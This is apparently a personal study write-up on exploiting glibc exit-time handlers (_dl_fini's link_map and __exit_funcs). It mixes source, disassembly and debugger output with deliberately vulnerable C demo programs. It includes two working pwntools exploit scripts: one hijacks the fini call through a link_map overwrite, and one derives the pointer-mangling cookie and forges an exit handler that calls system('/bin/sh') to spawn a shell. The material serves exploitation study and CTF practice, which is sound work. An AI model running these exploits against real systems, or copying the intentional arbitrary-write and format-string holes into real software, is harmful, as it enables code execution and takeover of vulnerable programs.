
### _dl_fini way

the great idea of this exploit is tricking the rtld_fini into miscalculating where .fini (function that calls destructor functions) is in memory 

```C
_dl_call_fini (void *closure_map)
{
  struct link_map *map = closure_map;

  /* When debugging print a message first.  */
  if (__glibc_unlikely (GLRO(dl_debug_mask) & DL_DEBUG_IMPCALLS))
    _dl_debug_printf ("\ncalling fini: %s [%lu]\n\n", map->l_name, map->l_ns);

  /* Make sure nothing happens if we are called twice.  */
  map->l_init_called = 0;

  ElfW(Dyn) *fini_array = map->l_info[DT_FINI_ARRAY];
  if (fini_array != NULL)
    {
      ElfW(Addr) *array = (ElfW(Addr) *) (map->l_addr
                                          + fini_array->d_un.d_ptr);
      size_t sz = (map->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
                   / sizeof (ElfW(Addr)));

      while (sz-- > 0)
        ((fini_t) array[sz]) ();
    }

  /* Next try the old-style destructor.  */
  ElfW(Dyn) *fini = map->l_info[DT_FINI];
  if (fini != NULL)
    DL_CALL_DT_FINI (map, ((void *) map->l_addr + fini->d_un.d_ptr));
}
```
see the assembly code of it...

```asm
Dump of assembler code for function _dl_call_fini:                                                                                                                                      
=> 0x0000784f503c1090 <+0>:     endbr64                                                                                                                                                 
   0x0000784f503c1094 <+4>:     push   rbp                                                                                                                                              
   0x0000784f503c1095 <+5>:     mov    rbp,rsp                                                                                                                                          
   0x0000784f503c1098 <+8>:     push   r13                                                                                                                                              
   0x0000784f503c109a <+10>:    push   r12                                                                                                                                              
   0x0000784f503c109c <+12>:    mov    r12,rdi                                                                                                                                          
   0x0000784f503c109f <+15>:    push   rbx                                                                                                                                              
   0x0000784f503c10a0 <+16>:    sub    rsp,0x8                                                                                                                                          
   0x0000784f503c10a4 <+20>:    test   BYTE PTR [rip+0x369f5],0x2        # 0x784f503f7aa0 <_rtld_global_ro>                                                                             
   0x0000784f503c10ab <+27>:    jne    0x784f503c1130 <_dl_call_fini+160>                                                                                                               
   0x0000784f503c10b1 <+33>:    mov    rax,QWORD PTR [r12+0x110]                                                                                                                        
   0x0000784f503c10b9 <+41>:    and    BYTE PTR [r12+0x354],0xef                                                                                                                        
   0x0000784f503c10c2 <+50>:    test   rax,rax                                                                                                                                          
   0x0000784f503c10c5 <+53>:    je     0x784f503c10fe <_dl_call_fini+110>                                                                                                               
   0x0000784f503c10c7 <+55>:    mov    r13,QWORD PTR [rax+0x8]                                                                                                                          
   0x0000784f503c10cb <+59>:    mov    rax,QWORD PTR [r12+0x120]                                                                                                                        
   0x0000784f503c10d3 <+67>:    add    r13,QWORD PTR [r12]                                                                                                                              
   0x0000784f503c10d7 <+71>:    mov    rax,QWORD PTR [rax+0x8]
   0x0000784f503c10db <+75>:    shr    rax,0x3
   0x0000784f503c10df <+79>:    lea    rdx,[rax-0x1]
   0x0000784f503c10e3 <+83>:    je     0x784f503c10fe <_dl_call_fini+110>
   0x0000784f503c10e5 <+85>:    lea    rbx,[r13+rdx*8+0x0]
   0x0000784f503c10ea <+90>:    nop    WORD PTR [rax+rax*1+0x0]
   0x0000784f503c10f0 <+96>:    call   QWORD PTR [rbx]
   0x0000784f503c10f2 <+98>:    mov    rax,rbx
   0x0000784f503c10f5 <+101>:   sub    rbx,0x8
   0x0000784f503c10f9 <+105>:   cmp    r13,rax
   0x0000784f503c10fc <+108>:   jne    0x784f503c10f0 <_dl_call_fini+96>
   0x0000784f503c10fe <+110>:   mov    rdx,QWORD PTR [r12+0xa8]
   0x0000784f503c1106 <+118>:   test   rdx,rdx
   0x0000784f503c1109 <+121>:   je     0x784f503c1120 <_dl_call_fini+144>
   0x0000784f503c110b <+123>:   mov    rax,QWORD PTR [r12]
   0x0000784f503c110f <+127>:   add    rax,QWORD PTR [rdx+0x8]
   0x0000784f503c1113 <+131>:   add    rsp,0x8
   0x0000784f503c1117 <+135>:   pop    rbx
   0x0000784f503c1118 <+136>:   pop    r12
   0x0000784f503c111a <+138>:   pop    r13
   0x0000784f503c111c <+140>:   pop    rbp
   0x0000784f503c111d <+141>:   jmp    rax
   0x0000784f503c111f <+143>:   nop
   0x0000784f503c1120 <+144>:   add    rsp,0x8
   0x0000784f503c1124 <+148>:   pop    rbx
   0x0000784f503c1125 <+149>:   pop    r12
   0x0000784f503c1127 <+151>:   pop    r13
   0x0000784f503c1129 <+153>:   pop    rbp
   0x0000784f503c112a <+154>:   ret
   0x0000784f503c112b <+155>:   nop    DWORD PTR [rax+rax*1+0x0]
   0x0000784f503c1130 <+160>:   mov    rdx,QWORD PTR [rdi+0x30]
   0x0000784f503c1134 <+164>:   mov    rsi,QWORD PTR [rdi+0x8]
   0x0000784f503c1138 <+168>:   xor    eax,eax
   0x0000784f503c113a <+170>:   lea    rdi,[rip+0x2ca3a]        # 0x784f503edb7b
   0x0000784f503c1141 <+177>:   call   0x784f503ceb00 <_dl_debug_printf>
   0x0000784f503c1146 <+182>:   jmp    0x784f503c10b1 <_dl_call_fini+33>

End of assembler dump.
```

the important part is the call to the memory that is pointed by rbx at offset 96 

keep this in your mind... will come back to it later

```asm
   0x0000784f503c10e5 <+85>:    lea    rbx,[r13+rdx*8+0x0]
   0x0000784f503c10ea <+90>:    nop    WORD PTR [rax+rax*1+0x0]
   0x0000784f503c10f0 <+96>:    call   QWORD PTR [rbx]

```

this is the state of the registers in _dl_call_fini

![rtld_glb](https://github.com/user-attachments/assets/63281dc3-0cf0-4d0a-9971-c6ccfbde69a7)

and here you see the address that is passed to the function is..

![call_to_fini](https://github.com/user-attachments/assets/2b956dcb-ed16-4252-a70b-931cdd6aec9d)

the link_map struct in the ldd

```C
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;		/* Difference between the address in the ELF
				   file and the addresses in memory.  */
    char *l_name;		/* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
  };

```

and the .dynamic section contains these structers:

```
gef> ptype _DYNAMIC
type = struct {
    Elf64_Sxword d_tag;
    union {
        Elf64_Xword d_val;
        Elf64_Addr d_ptr;
    } d_un;
} []
```

```
gef> p ((Elf64_Dyn *)0x403e28)->d_tag
$3 = 0xd
```
> print out the tag and ptr of the struct in gdb

```
gef> p ((Elf64_Dyn *)0x403e28)->d_un.d_ptr
$4 = 0x4012d4
```
> or check it in the source [code](https://elixir.bootlin.com/glibc/glibc-2.39/source/elf/elf.h#L861)

_ELF Dynamic Array Tags_

```C
#define DT_NULL		0		/* Marks end of dynamic section */
#define DT_NEEDED	1		/* Name of needed library */
#define DT_PLTRELSZ	2		/* Size in bytes of PLT relocs */
#define DT_PLTGOT	3		/* Processor defined value */
#define DT_HASH		4		/* Address of symbol hash table */
#define DT_STRTAB	5		/* Address of string table */
#define DT_SYMTAB	6		/* Address of symbol table */
#define DT_RELA		7		/* Address of Rela relocs */
#define DT_RELASZ	8		/* Total size of Rela relocs */
#define DT_RELAENT	9		/* Size of one Rela reloc */
#define DT_STRSZ	10		/* Size of string table */
#define DT_SYMENT	11		/* Size of one symbol table entry */
#define DT_INIT		12		/* Address of init function */
#define DT_FINI		13		/* Address of termination function */
#define DT_SONAME	14		/* Name of shared object */
#define DT_RPATH	15		/* Library search path (deprecated) */
#define DT_SYMBOLIC	16		/* Start symbol search here */
#define DT_REL		17		/* Address of Rel relocs */
#define DT_RELSZ	18		/* Total size of Rel relocs */
#define DT_RELENT	19		/* Size of one Rel reloc */
#define DT_PLTREL	20		/* Type of reloc in PLT */
#define DT_DEBUG	21		/* For debugging; unspecified */
#define DT_TEXTREL	22		/* Reloc might modify .text */
#define DT_JMPREL	23		/* Address of PLT relocs */
#define	DT_BIND_NOW	24		/* Process relocations of object */
#define	DT_INIT_ARRAY	25		/* Array with addresses of init fct */
#define	DT_FINI_ARRAY	26		/* Array with addresses of fini fct */
#define	DT_INIT_ARRAYSZ	27		/* Size in bytes of DT_INIT_ARRAY */
#define	DT_FINI_ARRAYSZ	28		/* Size in bytes of DT_FINI_ARRAY */
#define DT_RUNPATH	29		/* Library search path */
#define DT_FLAGS	30		/* Flags for the object being loaded */
#define DT_ENCODING	32		/* Start of encoded range */
#define DT_PREINIT_ARRAY 32		/* Array with addresses of preinit fct*/
#define DT_PREINIT_ARRAYSZ 33		/* size in bytes of DT_PREINIT_ARRAY */
#define DT_SYMTAB_SHNDX	34		/* Address of SYMTAB_SHNDX section */
#define DT_RELRSZ	35		/* Total size of RELR relative relocations */
#define DT_RELR		36		/* Address of RELR relative relocations */
#define DT_RELRENT	37		/* Size of one RELR relative relocaction */
#define	DT_NUM		38		/* Number used */
#define DT_LOOS		0x6000000d	/* Start of OS-specific */
#define DT_HIOS		0x6ffff000	/* End of OS-specific */
#define DT_LOPROC	0x70000000	/* Start of processor-specific */
#define DT_HIPROC	0x7fffffff	/* End of processor-specific */
#define	DT_PROCNUM	DT_MIPS_NUM	/* Most used by any processor */
```
> libc [code](https://elixir.bootlin.com/glibc/glibc-2.39/source/elf/elf.h#L861) or [this](https://docs.oracle.com/cd/E19683-01/817-3677/chapter6-42444/index.html) beauty

this is great help for understanding which is what as we dive into the assembly

we are going to follow this: `(DL_CALL_DT_FINI (map, ((void *) map->l_addr + fini->d_un.d_ptr));)`

so let's get started 😜

![dynamic](https://github.com/user-attachments/assets/b62e3bb2-a234-4cb3-bdcb-0e4cb2c5c5be)

```asm
    <+55>:    mov    r13,QWORD PTR [rax+0x8] 
 ```

rax holds the value at  `0x0000000000403e58` which is `tag 1a` = **DT_FINI_ARRAY**

and its ptr is (+8 offset) `0x0000000000403e00` (__do_global_dtors_aux_fini_array_entry) pointing to __do_global_dtors_aux

![do_global](https://github.com/user-attachments/assets/a027bd24-fee4-482f-b5bb-1d00387b9146)

```asm
     <+59>:    mov    rax,QWORD PTR [r12+0x120]                                                                                                                        
     <+67>:    add    r13,QWORD PTR [r12]   
```

now rax is `0x0000000000403e68`, `tag 1c` = **DT_FINI_ARRAYSZ**

r12 is still not changed and it's dereferencing to the value that __do_global_dtors_aux points to

so we are adding 0 to r13 (__do_global_dtors_aux_fini_array_entry)

```asm
    <+71>:    mov    rax,QWORD PTR [rax+0x8]
    <+75>:    shr    rax,0x3
    <+79>:    lea    rdx,[rax-0x1]
    <+83>:    je     0x784f503c10fe <_dl_call_fini+110> 
```
    
this time `dt_val` of **DT_FINI_ARRAYSZ** is moving to rax 

shr by 3 and - 0x1 resulting 0 in rdx

we don't take the jump...

```asm
    <+85>:    lea    rbx,[r13+rdx*8+0x0]
    <+90>:    nop    WORD PTR [rax+rax*1+0x0]
    <+96>:    call   QWORD PTR [rbx]
```

so it's only loading the addr from r13 to rbx

and will call the addr pointed by it (__do_global_dtors_aux)
```asm
    $rbx   : 0x0000000000403e00 <__do_global_dtors_aux_fini_array_entry>  ->  0x0000000000401180 <__do_global_dtors_aux>  ->  0x2ecd3d80fa1e0ff3  
```

so, if we can overwrite the link_map struct which is pointed by _rtld_global (they are in the writable section of the loader) 

we can have an arbitrary call...

and it is only 0x260 bytes behind from our buffer. 

to summ up:

1) find the link_map addr

2) calculate the offset from DT_FINI_ARRAY's d_un.d_ptr to the buffer 

3) overwrite the link_map pointer with the offset

4) profit..

here is the demo and codes (my first demo that i've ever created 🥹):

```C
// gcc -g demo.c -o demo -no-pie
#include <stdio.h>
#include <stdint.h>

char buf[0x256];
int main(){
        uint64_t addr;
        int size;
        printf("%p\n", stdout);
        printf("%21$lx\n");
        puts("addr?");
        scanf("%lx", &addr);
        puts("size?");
        scanf("%d", &size);
        puts("data?");
        fread((void *)addr,size,1,stdin);
        puts("reading into the buffer\n");
        scanf("%s", &buf);

        return 0;
}
```
> demo


```python3
#!/usr/bin/env python3

from pwn import *

p = gdb.debug("./demo", gdbscript="""
    b *main+236
    b *_dl_fini+499
    c
""")
leak = int(p.recvline().strip(), 16)
print(hex(leak))

ld_leak = p.recvline().strip()
ld_leak = int(ld_leak, 16)
ld_base = ld_leak - 0x38000
link_map = ld_base + 0x392e0

print(f"ld base: {hex(ld_base)}")
print(f"link_map: {hex(link_map)}")

p.sendlineafter(b"addr?\n", hex(link_map-8))
p.sendlineafter(b"size?\n", b"10")
p.sendlineafter(b"data?\n", p64(0x01) + b"\x03")
p.sendlineafter(b"buffer\n", b"a"*160 + p64(0xdeadbeef))

p.interactive()
```
> calling 0xdeadbeef

[Screencast from 2025-01-25 22-56-29.webm](https://github.com/user-attachments/assets/1a3c5750-77b0-4e97-a782-1f6898ad2a2b)

There are possibly other ways to exploit this without a buffer like in the demo

maybe you can call a got entry etc. etc.

some links that are may or may not be helpful 

- [issues in exit town](https://hackmd.io/@pepsipu/S15ivxPDt?utm_source=preview-mode&utm_medium=rec)
- [_r_debug](https://hackmd.io/@pepsipu/ry-SK44pt)
	> looks interesting...
- [ctf writeup with buffer like in the demo](https://activities.tjhsst.edu/csc/writeups/angstromctf-2021-wallstreet)
- nobodyisnobody's [docs](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/) and one of his [writeup](https://github.com/nobodyisnobody/write-ups/tree/main/DanteCTF.2023/pwn/Sentence.To.Hell)
- [another ctf challenge](https://chovid99.github.io/posts/dicectf-2024-quals/)

about dynamic linking

- [ELF Format Cheatsheet](https://gist.github.com/x0nu11byt3/bcb35c3de461e5fb66173071a2379779)
- [Dynamic Section (Linker and Libraries Guide)](https://docs.oracle.com/cd/E19683-01/817-3677/chapter6-42444/index.html) and [Initialization and Termination Routines](https://docs.oracle.com/cd/E19683-01/817-3677/6mj8mbtbi/index.html)
  	> for Solaris OS but useful
- def check [one](https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html) and [two](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)
> lots of reading waiting me ...

##### additional notes

looks like there are two `_start` one in the loader and one for the main which calls __libc_start_main

![twostarts](https://github.com/user-attachments/assets/a4f1d6ff-a3b4-4fa5-ac39-532bac3aa655)

from the source [code](https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/aarch64/dl-start.S#L35)

```
ENTRY (_start)
	/* Create an initial frame with 0 LR and FP */
	cfi_undefined (x30)
	mov	x29, #0
	mov	x30, #0

	mov	x0, sp
	PTR_ARG (0)
	bl	_dl_start
	/* Returns user entry point in x0.  */
	mov	PTR_REG (21), PTR_REG (0)
.globl _dl_start_user
.type _dl_start_user, %function
_dl_start_user:
	/* Get argc.  */
	ldr	PTR_REG (1), [sp]
	/* Get argv.  */
	add	x2, sp, PTR_SIZE
	/* Compute envp.  */
	add	PTR_REG (3), PTR_REG (2), PTR_REG (1), lsl PTR_LOG_SIZE
	add	PTR_REG (3), PTR_REG (3), PTR_SIZE
	adrp	x16, _rtld_local
	add	PTR_REG (16), PTR_REG (16), :lo12:_rtld_local
	ldr	PTR_REG (0), [x16]
	bl	_dl_init
	/* Load the finalizer function.  */
	adrp	x0, _dl_fini
	add	PTR_REG (0), PTR_REG (0), :lo12:_dl_fini
	/* Jump to the user's entry point.  */
	mov     x16, x21
	br      x16
END (_start)
```

when the program initialized some of the registers will hold memory addresses of the link_map and dl_fini etc. etc.

especially after _dl_start which can be helpful if debugging symbols is not enabled

> https://elixir.bootlin.com/glibc/glibc-2.39/source/elf/rtld.c#L516

this whole construction and destruction concept is huge and it needs to be studided more...

  
### __exit_funcs

exit() calls __run_exit_handlers...

![runexit](https://github.com/user-attachments/assets/bcb4c3e5-6f93-4ab3-97e8-aeafb49d8d18)

> https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/exit.c#L138

and __run_exit_handlers takes in a struct `exit_function_list **`, then for each entry in &initial it demangles the function pointers and calls them (writable addresses)

```c
static struct exit_function_list initial;
struct exit_function_list *__exit_funcs = &initial;
```
> https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/cxa_atexit.c#L74

```c
/* Call all functions registered with `atexit' and `on_exit',
   in the reverse of the order in which they were registered
   perform stdio cleanup, and terminate program execution with STATUS.  */
void
attribute_hidden
__run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
{
  /* First, call the TLS destructors.  */
  if (run_dtors)
    call_function_static_weak (__call_tls_dtors);

  __libc_lock_lock (__exit_funcs_lock);

  /* We do it this way to handle recursive calls to exit () made by
     the functions registered with `atexit' and `on_exit'. We call
     everyone on the list and use the status value in the last
     exit (). */
  while (true)
    {
      struct exit_function_list *cur;

    restart:
      cur = *listp;

      if (cur == NULL)
	{
	  /* Exit processing complete.  We will not allow any more
	     atexit/on_exit registrations.  */
	  __exit_funcs_done = true;
	  break;
	}

      while (cur->idx > 0)
	{
	  struct exit_function *const f = &cur->fns[--cur->idx];
	  const uint64_t new_exitfn_called = __new_exitfn_called;

	  switch (f->flavor)
	    {
	      void (*atfct) (void);
	      void (*onfct) (int status, void *arg);
	      void (*cxafct) (void *arg, int status);
	      void *arg;

	    case ef_free:
	    case ef_us:
	      break;
	    case ef_on:
	      onfct = f->func.on.fn;
	      arg = f->func.on.arg;
	      PTR_DEMANGLE (onfct);

	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      onfct (status, arg);
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    case ef_at:
	      atfct = f->func.at;
	      PTR_DEMANGLE (atfct);

	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      atfct ();
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    case ef_cxa:
	      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
		 we must mark this function as ef_free.  */
	      f->flavor = ef_free;
	      cxafct = f->func.cxa.fn;
	      arg = f->func.cxa.arg;
	      PTR_DEMANGLE (cxafct);

	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      cxafct (arg, status);
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    }

	  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
	    /* The last exit function, or another thread, has registered
	       more exit functions.  Start the loop over.  */
	    goto restart;
	}

      *listp = cur->next;
      if (*listp != NULL)
	/* Don't free the last element in the chain, this is the statically
	   allocate element.  */
	free (cur);
    }

  __libc_lock_unlock (__exit_funcs_lock);

  if (run_list_atexit)
    call_function_static_weak (_IO_cleanup);

  _exit (status);
}
```
> https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/exit.c#L31

check the assembly code to reason about how the demangling is done

```asm
(...)
=> 0x00007ffff7c47a30 <+304>:   mov    rcx,QWORD PTR [rax+0x18]                                                                                                                         
   0x00007ffff7c47a34 <+308>:   mov    r8,QWORD PTR [rax+0x20]                                                                                                                          
   0x00007ffff7c47a38 <+312>:   mov    QWORD PTR [rax+0x10],0x0                                                                                                                         
   0x00007ffff7c47a40 <+320>:   mov    rax,rcx                                                                                                                                          
   0x00007ffff7c47a43 <+323>:   mov    ecx,r13d                                                                                                                                         
   0x00007ffff7c47a46 <+326>:   ror    rax,0x11                                                                                                                                         
   0x00007ffff7c47a4a <+330>:   xor    rax,QWORD PTR fs:0x30                                                                                                                            
   0x00007ffff7c47a53 <+339>:   xchg   DWORD PTR [rbx],ecx                                                                                                                              
   0x00007ffff7c47a55 <+341>:   cmp    ecx,0x1                                                                                                                                          
   0x00007ffff7c47a58 <+344>:   jg     0x7ffff7c47b38 <__run_exit_handlers+568>                                                                                                         
   0x00007ffff7c47a5e <+350>:   mov    esi,r14d                                                                                                                                         
   0x00007ffff7c47a61 <+353>:   mov    rdi,r8                                                                                                                                           
   0x00007ffff7c47a64 <+356>:   call   rax
(...)
```

rax is the exit_function_list struct (aka initial)

```
type = struct exit_function_list {                                                                                                                                                      
    struct exit_function_list *next;                                                                                                                                                    
    size_t idx;                                                                                                                                                                         
    struct exit_function fns[32];                                                                                                                                                       
} * 
```
> ptype &initial

this struct has [flavors](https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/exit.h#L25) to choose from 

our entry uses the ef_cxa flavor and rax+0x18 offset is the mangled_ptr (of a function)

so it is moving the mangled_ptr to rcx and preparing its argument by moving it to r8 (our flavor takes argument)

```c
$4 = {
  next = 0x0,
  idx = 0x0,
  fns = {
    [0x0] = {
      flavor = 0x4,
      func = {
        at = 0xb3e7fe095762b031,
        on = {
          fn = 0xb3e7fe095762b031,
          arg = 0x0
        },
        cxa = {
          fn = 0xb3e7fe095762b031,
          arg = 0x0,
          dso_handle = 0x0
        }
      }
    },
    [0x1] = {
      flavor = 0x0,
      func = {
        at = 0x0,
        on = {
          fn = 0x0,
          arg = 0x0
        },
        cxa = {
          fn = 0x0,
          arg = 0x0,
          dso_handle = 0x0
        }
      }
    } <repeats 31 times>
  }
}
```
> p initial

as you can see here, the argument that will be passed to the mangled_ptr is 0

![rax](https://github.com/user-attachments/assets/c3af6045-2cde-4438-85f3-a408f8281ef3)

now it zero-outs the flavor of our exit_function_list and moves the mangled_ptr to the rax

ecx is also zero-out'ed too

```asm
   0x00007ffff7c47a38 <+312>:   mov    QWORD PTR [rax+0x10],0x0                                                                                                                         
   0x00007ffff7c47a40 <+320>:   mov    rax,rcx                                                                                                                                          
   0x00007ffff7c47a43 <+323>:   mov    ecx,r13d 
```

and the demangling begins...

```asm
   0x00007ffff7c47a46 <+326>:   ror    rax,0x11                                                                                                                                         
   0x00007ffff7c47a4a <+330>:   xor    rax,QWORD PTR fs:0x30
(...)
   0x00007ffff7c47a61 <+353>:   mov    rdi,r8                                                                                                                                           
   0x00007ffff7c47a64 <+356>:   call   rax
```

mangled_ptr is rotated right by 0x11 and xor'ed with the PTR_MANGLE cookie (aka pointer_guard) stored in the tls (fs:0x30)

which reveals that it is a call to the **_dl_fini** function!

now we know which function its calling so the question is...

can we guess the pointer_guard with only mangled and demangled_ptr ? 

why yes, of course!

here is the recipe 🧑‍🍳

1) first leak the mangled_ptr (_dl_fini) in exit_function_list and the address of _dl_fini 🍚 🧈 🍳 🍶 🍜 🧁 🍫 

2) ror the mangled_ptr with 0x11  🧂

3) xor it with _dl_fini 🔥

4) and you get the PTR_MANGLE cookie 🍪 !!!

 	> now you can mangle pointers with a simple encrypt function as in the disassembly, enjoy! 😋 

and as for the dessert, you can overwrite the exit_function_list with your very own struct to pop a shell...

ef_cxa flavor is highly recommend among the chefs because it takes a sweet argument 😉 

anyway, here's the improved ~~quaility~~ demo and the exploit:

```c
// gcc -g demo.c -o demo -no-pie
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

char buf[0x256];

int main(){
	uint64_t addr;
	uint64_t *mangled_ptr;
	int size;
	printf("%p\n", stdout);
	printf("%21$lx\n");
	printf("%p\n", system);
	puts("mangled_ptr?");
	scanf("%lx", &mangled_ptr);
	puts("writing out the data pointed by addr");
	printf("%p\n", *mangled_ptr);
	puts("addr?");
	scanf("%lx", &addr);
	puts("size?");
	scanf("%d", &size);
	puts("data?");
	fread((void *)addr,size,1,stdin);
	puts("reading into the buffer\n");
	scanf("%s", &buf);

	return 0;
}
```

```python
#!/usr/bin/env python3

from pwn import *
'''
p = gdb.debug("./demo", gdbscript="""
    b *main+398
    c
""")
'''
p = process("./demo")
leak = int(p.recvline().strip(), 16)

ld_leak = p.recvline().strip()
ld_leak = int(ld_leak, 16)
system = int(p.recvline().strip(), 16)
libc_base = system - 0x58740
binsh = libc_base + 0x1cb42f
exit_func_list = libc_base + 0x204fd8
ld_base = ld_leak - 0x38000
link_map = ld_base + 0x392e0 
dl_fini = ld_base + 0x5380

print(f"libc base: {hex(libc_base)}")
print(f"dl_fini: {hex(dl_fini)}")
print(f"mangled ptr at: {hex(exit_func_list)}")

p.sendlineafter(b"mangled_ptr?\n", hex(exit_func_list).encode('utf-8'))
p.recvline()
mangled_dl_fini = int(p.recvline().strip(), 16)
print(f"mangled dl_fini pointer is {hex(mangled_dl_fini)}")

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def mangle(ptr, cookie):
    return rol(ptr ^ cookie, 0x11, 64)

def demangle(mangled_ptr, ptr):
    return ror(mangled_ptr, 0x11, 64) ^ ptr

cookie = demangle(mangled_dl_fini, dl_fini)
print(f"PTR_MANGLE cookie: {hex(cookie)}") 
print(f"mangled system: {hex(mangle(system, cookie))}")

p.sendlineafter(b"addr?\n", hex(exit_func_list-32).encode('utf-8')) 
p.sendlineafter(b"size?\n", b"54")
# fake struct to call system("/bin/sh") (a's are not related to the struct)
p.sendlineafter(b"data?\n", b"a"*7 + p64(0x00) + p64(0x01) + p64(0x04) + p64(mangle(system, cookie)) + p64(binsh) + p64(0x00))

# this is not important
p.sendlineafter(b"buffer\n", b"echo et pour le desert...")

p.interactive()
```
and live action!

[Screencast from 2025-01-26 22-28-33.webm](https://github.com/user-attachments/assets/3a8f13e5-4160-4d2f-9ee5-52401742aefc)

##### some helpful links

- https://elijahchia.gitbook.io/ctf-blog/advent-of-ctf-2024/help-pwn

- https://ctftime.org/writeup/34804

- [bitwise rotation in python](https://www.falatic.com/index.php/108/python-and-bitwise-rotation)

- https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html


